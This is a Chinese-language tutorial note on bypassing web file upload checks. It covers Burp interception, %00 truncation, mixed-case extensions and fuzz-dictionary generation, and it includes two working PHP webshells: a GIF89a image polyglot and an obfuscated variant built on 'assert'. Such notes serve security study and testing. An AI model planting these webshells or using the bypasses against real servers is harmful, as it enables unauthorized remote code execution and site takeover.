## 文件上传漏洞

前端策略不做考虑，一般使用`burpsuite`抓包修改绕过。
比如上传一个`.gif`文件，再进行抓包修改成.php 文件上传。

## 绕过方式

首先判断是程序员自己写的上传点，还是编辑器的上传功能。

- 如果是编辑器上传功能，上网查找当前编辑器的漏洞。
- 如果是写的上传点 上传一个正常的 jpg 图片 查看上传点是否可用 上传一个正常的 jpg 图片，burp 拦截，修改后缀为 php (可以检测前端验证 MIME 检测 文件内容检测 后缀检测) 上传一个正常的 jpg 图片，burp 拦截， 00 截断 1.php%00.jpg 判断服务器是什么类型，web 服务器程序，是什么类型，版本号多少 利用解析漏洞。

### MIME 检测 文件头 content-type 字段校验

面对这方式，一般都可以把木马改成.gif 上传。

在使用一句话木马的时候，也可以在前后混淆图片。

#### PHP %00 截断

PHP<5.3.4 时 shell.php%00.jpg 可截断%00 后的内容，配合服务器中间件解析漏洞绕过。

### 文件扩展名黑名单校验

一般情况下都可以使用大小写或者其他方式绕过比如:

```bash
.pHp .AsP .phpphp
```

#### fuzz 脚本

使用[upload-fuzz-dic-builder](https://github.com/c0ny1/upload-fuzz-dic-builder) 工具生成 fuzz 字典，并且导入`burpsuite`中使用是比较方便的，并且生成时给的上传点相关信息越详细，生成的字典越精确。

比如：上传文件名为：test，可以上传后缀为 jpg，后端语言为 php，中间件为 apache，操作系统为 Windows，输出字典名为 upload_filename.txt 的 fuzz 字典

```bash
python upload-fuzz-dic-builder.py -n test -a jpg -l php -m apache --os win -o upload_file.txt
```

### 检测内容是否合法或含有恶意代码

通过开头的文件幻数进行检测：判断文件开头的前 10 个字节，基本就能判断出一个文件的真实类型

文件格式幻数（magic number），它可以用来标记文件或者协议的格式

大部分文件的文件幻数都含有不便于输入的特殊字符，而 gif 图的文件幻数为 GIF89a，可以方便地利用

```php
GIF89a <image binary data> <?php @eval($_POST['shell']);?> <image binary data>
```

也可以使用变量名代替函数

```php
<?php
$a="TR"."Es"."sA";
$b=strtolower($a);
$c=strrev($b);
@$c($_POST['shell']);
?>
```




### 其他资料

[yinwc](https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#/%E5%88%A9%E7%94%A8RTLO)
[SecIN社区](https://www.cnblogs.com/SecIN/p/17055942.html)
